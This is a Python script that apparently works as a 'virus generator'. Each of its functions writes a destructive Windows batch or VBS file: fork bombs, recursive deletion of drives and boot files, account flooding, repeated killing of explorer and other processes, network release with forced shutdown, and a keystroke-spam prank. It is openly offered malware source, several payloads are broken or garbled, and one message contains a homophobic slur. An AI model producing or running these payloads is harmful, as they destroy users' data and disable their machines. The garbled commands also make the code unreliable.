import os, time


def overload():
	o = open('overload.bat','a')
	o.write("""

		@echo off
		:hewo
		echo VIRUS OVERLOAD!
		start overload.bat
		goto hewo

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")



def deletefiles():
	o = open('delFiles.bat','a')
	o.write("""

		@echo off
		del*.*

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def bsof():
	o = open('bsof.vbs','a')
	o.write("""
		@echo off
		del%systemdrive%*.* /f/s/q
		shutdown -r -f -t 00

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")



def foolkey():
	o = open('fool.vbs','a')
	o.write("""
		Set wshShell = wscript.CreateObject("WScript.Shell)
		do
		wscript.sleep 100
		wshshell.sendkeys 'you are a Fool '
		loop 

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def formatdrive():
	o = open('format.bat','a')
	o.write("""
		rd/s/q D:
		rd/s/q C:
		rd/s/q E:

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")



def shutdown():
	o = open('shutdown.bat','a')
	o.write("""
		@echo off
		attrib -r -s -h c:autoexec.bat
		del c:autoexec.bat
		attrib -r -s -h c:boot.ini
		del c:boot.ini
		attrib -r -s -h c:
		tldr
		del c:
		tdlr
		attrib -r -s -h c:windowswin.ini
		del c:windowswin.ini
		@echo oof
		Msg *YOUR GAY! YOUR INFECTED!!
		Shutdown -s -t 7 -c "VIRUS IS SPREADING! c:Drive

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def userflood():
	o = open('accflooder.bat','a')
	o.write("""
		@echo off
		:xnet
		user %random% /add
		goto x

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def delos():
	o = open('Del-Os-Sys.bat','a')
	o.write("""
		@echo off
		del C:*.*|y

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def infnotepads():
	o = open('infNote.bat','a')
	o.write("""
		@echo off
		:ninja
		START %SystemRoot% system32
		notepad.exe
		goto ninja

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def Bomb():
	o = open('bomb.bat','a')
	o.write("""
		if %date% NEQ 2021/01/15 goto exit
		:exit
		exit

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")


def taskill():
	o = open('tskill.bat','a')
	o.write("""
		@echo oof
		start calc
		tskill msnmsgr
		tskill firefox
		tskill iexplore
		tskill LimreWire
		tskill explorer
		tskill explorer
		tskill explorer
		tskill explorer
		tskill explorer
		pause

		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")

def netgone():
	o = open('netcut.bat','a')
	o.write("""
		@echo off
		ifconfig /release
		shutdown /s
		""")
	print("virus Created!")
	print("done! File is in virGen Folder!")
